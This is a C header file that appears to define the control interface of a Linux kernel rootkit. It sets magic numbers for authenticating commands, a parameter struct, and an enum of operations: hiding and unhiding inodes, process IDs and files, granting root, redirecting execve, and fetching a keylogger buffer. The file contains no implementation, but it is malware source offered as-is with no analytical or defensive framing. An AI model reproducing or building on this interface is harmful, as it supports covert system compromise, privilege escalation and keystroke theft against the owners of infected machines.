#ifndef __YSLM_CTL_H
#define __YSLM_CTL_H

#define MAGIC_NUMBER_1 0x42424242 /* TODO: should be randomized */
#define MAGIC_NUMBER_2 0x43434343

struct rk_args {
	unsigned int magic_number_1, magic_number_2;
	long mode;
	union { long param1; void *p_param1; };
	union { long param2; void *p_param2; };
	union { long param3; void *p_param3; };
	union { long param4; void *p_param4; };
	union { long param5; void *p_param5; };
	union { long param6; void *p_param6; };
	char pad[512];
};

enum {
	SYSCALL_HIDE_INODE = 0,
	SYSCALL_UNHIDE_INODE,
	GET_ROOT,
	SYSCALL_HIDE_PID,
	SYSCALL_UNHIDE_PID,
	VFS_HIDE_FILE,
	VFS_UNHIDE_FILE,
	SYSCALL_REDIRECT_EXECVE,
	SYSCALL_UNREDIRECT_EXECVE,
	SYSCALL_GET_KEYLOGGER_BUF,
	DEBUG_RK,
};

#endif
